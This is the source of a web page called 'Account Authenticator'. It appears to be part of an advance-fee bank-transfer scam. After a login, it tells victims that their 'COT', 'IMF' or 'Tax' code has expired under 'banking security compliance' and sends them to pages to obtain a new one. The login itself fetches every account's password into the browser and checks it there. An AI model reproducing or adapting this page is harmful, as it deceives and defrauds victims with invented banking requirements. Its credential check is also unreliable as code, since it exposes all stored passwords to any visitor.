<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Account Authenticator</title>
  <link rel="icon" type="image/png" href="images/favicon.png" />
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: url('images/background.png') no-repeat center center fixed;
      background-size: cover;
    }
    .auth-box {
      background: white;
      padding: 30px;
      width: 90%;
      max-width: 400px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      text-align: center;
      animation: fadeSlideIn 1s ease-out forwards;
    }
    @keyframes fadeSlideIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .site-logo {
      width: 90px;
      margin-bottom: 10px;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 16px;
      box-sizing: border-box;
    }
    button {
      background: gray;
      color: white;
      font-weight: bold;
      cursor: not-allowed;
    }
    button.active {
      background: #28a745;
      cursor: pointer;
    }
    .password-wrapper {
      position: relative;
      width: 100%;
    }
    .password-wrapper input {
      width: 100%;
      padding-right: 40px;
    }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 12px;
      transform: translateY(-50%);
      font-size: 20px;
      cursor: pointer;
    }
    .status-icon {
      position: absolute;
      top: 50%;
      right: 35px;
      transform: translateY(-50%);
      font-size: 18px;
    }
    .status-icon.valid { color: green; }
    .status-icon.invalid { color: red; }

    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.6);
      justify-content: center;
      align-items: center;
      z-index: 999;
    }
    .modal-content {
      background: white;
      padding: 25px 25px 20px;
      border-radius: 10px;
      width: 90%;
      max-width: 400px;
      text-align: center;
      position: relative;
      animation: fadeIn 0.3s ease-in-out, breathing 3s ease-in-out infinite;
    }
    .modal-content #modalClose {
      position: absolute;
      top: 10px;
      right: 15px;
      font-size: 24px;
      cursor: pointer;
      color: #333;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
    @keyframes breathing {
      0%, 100% { transform: scale(1); box-shadow: 0 0 10px rgba(0, 123, 255, 0.3); }
      50% { transform: scale(1.03); box-shadow: 0 0 20px rgba(0, 123, 255, 0.5); }
    }
    #modalBtn {
      margin-top: 15px;
      padding: 12px;
      border-radius: 6px;
      background: #007BFF;
      color: white;
      font-weight: bold;
      border: none;
      cursor: pointer;
    }
    small {
      display: block;
      margin-top: 3px;
      font-size: 0.85em;
      text-align: left;
      padding-left: 3px;
    }
    input.valid { border-color: green; }
    input.invalid { border-color: red; }
  </style>
</head>
<body>
  <div class="auth-box">
    <div class="site-heading">
      <img src="images/logo.png" alt="Site Logo" class="site-logo" />
      <h2>🔐 Account Authenticator</h2>
    </div>
    <p>Access Codes Required to process International Transfers!</p>
    <form id="authForm">
      <div style="position: relative;">
        <input type="tel" id="accountId" inputmode="numeric" placeholder="Enter 10-digit Account ID" maxlength="10" required />
        <span id="accountStatus" class="status-icon"></span>
      </div>
      <small id="idHint"></small>

      <div class="password-wrapper">
        <input type="password" id="password" placeholder="Enter Password" required />
        <span class="toggle-password" id="togglePassword">💰</span>
        <span id="passwordStatus" class="status-icon"></span>
      </div>
      <small id="passHint"></small>

      <button type="submit" id="verifyBtn" disabled>Verify Account</button>
    </form>
  </div>

  <div class="modal" id="modal">
    <div class="modal-content">
      <span id="modalClose">&times;</span>
      <h3 id="modalTitle">Notice</h3>
      <p id="modalMessage"></p>
      <button id="modalBtn">Continue</button>
    </div>
  </div>

  <script src="js/auth-lookup.js"></script>
  <script>
    document.getElementById("togglePassword").addEventListener("click", () => {
      const pass = document.getElementById("password");
      const toggle = document.getElementById("togglePassword");
      if (pass.type === "password") {
        pass.type = "text";
        toggle.textContent = "🙈";
      } else {
        pass.type = "password";
        toggle.textContent = "💰";
      }
    });

    document.addEventListener("DOMContentLoaded", () => {
      const accountIdInput = document.getElementById("accountId");
      const passwordInput = document.getElementById("password");
      const verifyBtn = document.getElementById("verifyBtn");
      const modal = document.getElementById("modal");
      const modalTitle = document.getElementById("modalTitle");
      const modalMessage = document.getElementById("modalMessage");
      const modalBtn = document.getElementById("modalBtn");
      const modalClose = document.getElementById("modalClose");
      const accountStatus = document.getElementById("accountStatus");
      const passwordStatus = document.getElementById("passwordStatus");

      modalClose.addEventListener("click", () => {
        modal.style.display = "none";
      });

      async function getAccounts() {
        try {
          const res = await fetch("api/get-accounts.php");
          return await res.json();
        } catch {
          return [];
        }
      }

      function validateInputs() {
        const idValid = /^\d{10}$/.test(accountIdInput.value);
        const passValid = passwordInput.value.trim().length >= 4;

        accountIdInput.classList.toggle("valid", idValid);
        accountIdInput.classList.toggle("invalid", !idValid);
        passwordInput.classList.toggle("valid", passValid);
        passwordInput.classList.toggle("invalid", !passValid);

        accountStatus.textContent = idValid ? "✔" : "✖";
        accountStatus.className = "status-icon " + (idValid ? "valid" : "invalid");

        passwordStatus.textContent = passValid ? "✔" : "✖";
        passwordStatus.className = "status-icon " + (passValid ? "valid" : "invalid");

        verifyBtn.disabled = !(idValid && passValid);
        verifyBtn.classList.toggle("active", idValid && passValid);
      }

      accountIdInput.addEventListener("input", validateInputs);
      passwordInput.addEventListener("input", validateInputs);

      document.getElementById("authForm").addEventListener("submit", async (e) => {
        e.preventDefault();
        const accountId = accountIdInput.value.trim();
        const password = passwordInput.value.trim();
        const accounts = await getAccounts();
        const user = accounts.find(u => u.accountId === accountId && u.password === password);

        if (!user) {
          modalTitle.textContent = "❌ Invalid Credentials";
          modalMessage.textContent = "The Account ID or password is incorrect.";
          modalBtn.style.display = "none";
          modal.style.display = "flex";
          return;
        }

        localStorage.setItem("accountId", user.accountId);
        localStorage.setItem("selectedCodeType", user.codeType);

        modalTitle.textContent = `Your ${user.codeType} Code has expired and requires re-activation!`;
        modalMessage.innerHTML = `<strong>Welcome, ${user.name} (ID: ${user.accountId})</strong><br><br>` +
          `You are required to retrieve your <strong>${user.codeType} Code</strong> again to proceed with your international transaction.<br><br>` +
          `Codes expire periodically due to banking security compliance and must be refreshed before a transaction can be finalized.`;

        modalBtn.textContent = `Get ${user.codeType} Code`;
        modalBtn.style.display = "inline-block";
        modalBtn.onclick = () => {
          modal.style.display = "none";
          const pageMap = {
            COT: "get-cot-code",
            IMF: "get-imf-code",
            Tax: "get-tax-code"
          };
          window.location.href = pageMap[user.codeType] || "get-cot-code";
        };

        modal.style.display = "flex";
      });
    });
  </script>
</body>
</html>
